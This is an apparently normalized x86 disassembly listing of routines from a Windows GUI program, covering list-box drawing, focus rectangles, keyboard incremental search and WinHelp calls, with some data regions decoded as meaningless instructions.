mov cl 0x1
mov eax esi
call sub_445bf8
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_4458a0
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44d834
jmp r-xdata
sub_446050
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_44cd98
mov eax esi
mov si 0xffeb
call sub_40338c
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40338c
jmp r-xdata
pop esi
retn
sub_446084
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_453a88
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_453a88
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_453a88
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_453a88
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_453a88
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_445a00
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_416e34
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_4461e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451c18
push ebp
call sub_446084
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_446228
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_44ccd0
lea eax [ esp + 0x18 ]
call sub_406b14
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_446288
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446394
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_4245b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44639b
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edx 0x824
mov eax ebx
call sub_44f46c
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4468ac
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403f20
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x228 ]
call sub_424a0c
push eax
call DrawTextA
sub_4463c4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_424a8c
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_42492c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_424948
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_4245b0
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_42420c
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a40
xor edx edx
mov eax [ esi + 0x228 ]
call sub_424a8c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_446480
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_4464b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4530a0
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_451028
sub_4464dc
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_4458f0
inc edi
dec ebx
jne r-xdata
sub_446514
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4043e0
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4468f4
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_40338c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406b34
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_4465f8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4467b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_452a6c
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4467bf
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403f44
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403f20
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4041e0
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c218
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4041e0
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404480
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4041e0
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404480
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404108
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_4041e8
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_453a88
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_40338c
push ebp
call sub_446514
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4041e0
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404108
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404108
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_4042a0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_4467c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44689c
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_453a88
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4468a3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_4468cc
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_4468f4
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_446918
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44693d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446944
retn
sub_446a44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459998
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_446a80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_446aa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446aac
retn
sub_446b50
xor [ ebx + 0x44 ] ebp
add [ ebx ] bh
imul eax [ eax + eax + 0x45 ] 0x6b
inc esp
add cl ch
push 0x44
add cl dh
push 0x44
add cl bh
push 0x44
add [ ecx ] al
imul eax [ eax + eax + 0x9 ] 0x6b
inc esp
add [ ecx ] dl
imul eax [ eax + eax + 0x19 ] 0x6b
inc esp
add [ ecx ] ah
imul eax [ eax + eax + 0x29 ] 0x6b
inc esp
add cl cl
push 0x44
cmp ebp [ ebx + 0x44 ]
add [ ebp + 0x6b ] al
cmp dl [ eax + 0x6b ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add cl dl
push 0x44
add cl bl
push 0x44
add cl ah
push 0x44
adc [ ebx + 0x44 ] ebp
add [ ecx ] bl
imul eax [ eax + eax + 0x21 ] 0x6b
inc esp
add [ ecx ] ch
imul eax [ eax + eax - 0x37 ] 0x6a
inc esp
cmp dl [ eax + 0x6b ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
loope r-xdata
cmp dl [ eax + 0x6b ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
insb
inc esp
cmp [ esp + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
insb
inc esp
add [ eax + eax ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
fdiv [ ebx ]
inc eax
add [ eax + ebx * 2 ] cl
inc eax
add [ eax ] bl
pop eax
inc eax
add ah ch
xor eax [ eax ]
loopne r-xdata
add cl al
push 0x44
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
ja r-xdata
inc eax
add [ eax ] ch
pop eax
inc eax
add [ ecx + esi + 0x40 ] al
add al bl
jbe r-xdata
and [ ebx + 0x47eb043d ] al
add [ eax ] al
jb r-xdata
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
mov eax esi
call sub_403f20
test edi edi
jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
mov [ edi + 0x1c0042 ] dh
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d20
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042a0
add [ ebx + ebp * 2 + 0x44 ] dl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446d19
push [ fs : eax ]
inc eax
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403fb8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
je r-xdata
cmp [ rw-data ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_446c64
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446d19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f20
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403fb8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d20
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042a0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_446d34
push ebx
mov ebx eax
mov eax ebx
call sub_447064
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_40578c
sub_446d70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446dd7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_446c64
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446dde
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_446de8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_446e70
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_446d5c
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042a0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446e77
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
sub_446e83
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_446f0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4475a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446f12
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_446c64
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446e90
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_446f0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4475a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446f12
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_446c64
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446f18
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447010
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_446c64
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d6c
mov eax ebx
call sub_4475a8
test al al
je r-xdata
mov ecx sub_446ab8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447017
lea eax [ ebp - 0x1c ]
call sub_403f20
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_446c64
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_447500
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f74
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447080
push ebx
mov ebx eax
mov eax ebx
call sub_447064
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_40578c
pop ebx
retn
mov eax rw-data
call sub_40578c
sub_4470b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_447108
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44710f
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_446c64
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_447118
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44720e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408d2c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_446c64
mov eax ebx
call sub_4475a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447215
lea eax [ ebp - 0x110 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404190
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_447500
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
